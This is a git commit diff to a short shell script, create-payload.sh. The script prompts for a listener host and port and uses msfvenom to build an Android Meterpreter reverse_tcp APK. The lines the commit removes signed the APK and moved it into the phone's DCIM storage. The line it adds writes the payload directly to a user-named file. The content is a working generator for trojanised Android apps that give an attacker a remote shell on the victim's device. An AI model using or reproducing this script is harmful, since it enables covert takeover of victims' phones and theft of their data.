da6fc8e995019098e5203353a2d92e99bb3bd55c
Dot In <57308042+D071N@users.noreply.github.com>
2022-06-22 22:17:09 +0530

    Update create-payload.sh

--- create-payload.sh
+++ create-payload.sh
@@ -4,7 +4,4 @@
 read -p 'Enter port for LHOST: ' lhost
 read -p 'Enter port for LPORT: ' port
 read -p 'Enter output filename: ' output
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$port R > Newtest.apk
-apksigner autokey Newtest.apk Testing.apk
-mv Testing.apk ~/storage/dcim/$output.apk
-rm Newtest.apk autokey
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$port R > $output.apk
